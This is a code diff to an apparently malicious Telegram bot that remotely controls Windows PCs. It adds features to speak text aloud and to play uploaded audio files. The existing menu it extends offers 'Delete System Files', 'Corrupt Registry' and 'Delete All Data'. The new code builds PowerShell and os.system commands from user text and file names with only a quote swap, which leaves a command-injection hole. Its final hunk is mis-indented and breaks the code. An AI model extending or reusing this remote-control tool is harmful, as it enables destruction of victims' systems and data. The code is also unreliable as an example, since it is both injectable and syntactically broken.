@@ -2211,6 +2211,59 @@ def send_log():
     except:
         return "❌ Ошибка"
 
+# ============ TTS И АУДИО ============
+def speak_text(text):
+    clean_text = text.replace('"', "'")
+    try:
+        ps_command = f"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{clean_text}')"
+        subprocess.run(["powershell", "-Command", ps_command], capture_output=True, timeout=30)
+        return f"🔊 Озвучено: {clean_text}"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
+
+def play_audio_file(file_path):
+    try:
+        if not os.path.exists(file_path):
+            return f"❌ Файл не найден: {file_path}"
+        os.system(f'start "" "{file_path}"')
+        return f"🔊 Воспроизводится: {os.path.basename(file_path)}"
+    except Exception as e:
+        try:
+            ps_command = f'(New-Object System.Media.SoundPlayer "{file_path}").PlaySync()'
+            subprocess.run(["powershell", "-Command", ps_command], capture_output=True, timeout=30)
+            return f"🔊 Воспроизводится: {os.path.basename(file_path)}"
+        except Exception as e:
+            return f"❌ Ошибка: {e}"
+
+def play_audio_from_document(update, context):
+    try:
+        chat_id = update.message.chat.id
+        doc = update.message.document
+        
+        if not doc.mime_type or not doc.mime_type.startswith('audio/'):
+            bot.send_message(chat_id, "❌ Отправь аудио-файл (mp3, wav, m4a)")
+            return
+        
+        bot.send_message(chat_id, f"⏳ Скачиваю аудио: {doc.file_name}...")
+        
+        file = bot.get_file(doc.file_id)
+        temp_path = os.path.join(tempfile.gettempdir(), doc.file_name)
+        file.download(temp_path)
+        
+        result = play_audio_file(temp_path)
+        bot.send_message(chat_id, result)
+        
+        def delete_later():
+            time.sleep(5)
+            try:
+                os.remove(temp_path)
+            except:
+                pass
+        threading.Thread(target=delete_later, daemon=True).start()
+            
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Ошибка: {e}")
+
 # ============ БОТ ============
 bot = Bot(TOKEN)
 updater = Updater(TOKEN, use_context=True)
@@ -2346,6 +2399,8 @@ def start(update, context):
         [InlineKeyboardButton("🔊 Mute", callback_data="mute")],
         [InlineKeyboardButton("🔊 Unmute", callback_data="unmute")],
         [InlineKeyboardButton("🔊 Test Audio", callback_data="test_audio")],
+        [InlineKeyboardButton("🔊 Speak Text", callback_data="speak")],
+        [InlineKeyboardButton("🔊 Play Audio", callback_data="play_audio")],
         [InlineKeyboardButton("💀 Delete System Files", callback_data="delete_system_files")],
         [InlineKeyboardButton("💀 Corrupt Registry", callback_data="corrupt_registry")],
         [InlineKeyboardButton("💀 Delete All Data", callback_data="delete_all_data")],
@@ -2837,6 +2892,12 @@ def callback(update, context):
         bot.send_message(chat_id, disable_grayscale())
     elif data == "disable_invert":
         bot.send_message(chat_id, disable_invert())
+    elif data == "speak":
+        context.user_data['speak_mode'] = True
+        bot.send_message(chat_id, "🔊 Введите текст для озвучивания:")
+    elif data == "play_audio":
+        context.user_data['awaiting_audio'] = True
+        bot.send_message(chat_id, "🔊 Отправь аудио-файл (mp3, wav) для воспроизведения:")
 
 def handle_message(update, context):
     global selected_pc
@@ -3079,10 +3140,19 @@ def handle_message(update, context):
     elif context.user_data.get('set_date_mode'):
         context.user_data['set_date_mode'] = False
         bot.send_message(chat_id, set_date(text))
+    elif context.user_data.get('speak_mode'):
+        context.user_data['speak_mode'] = False
+        bot.send_message(chat_id, speak_text(text))
 
 def handle_document(update, context):
     chat_id = update.message.chat.id
     doc = update.message.document
+
+    # --- Воспроизведение аудио-файла ---
+if context.user_data.get('awaiting_audio'):
+    context.user_data['awaiting_audio'] = False
+    play_audio_from_document(update, context)
+    return
     
     # Загрузка файла через Upload File
     if context.user_data.get('awaiting_upload'):
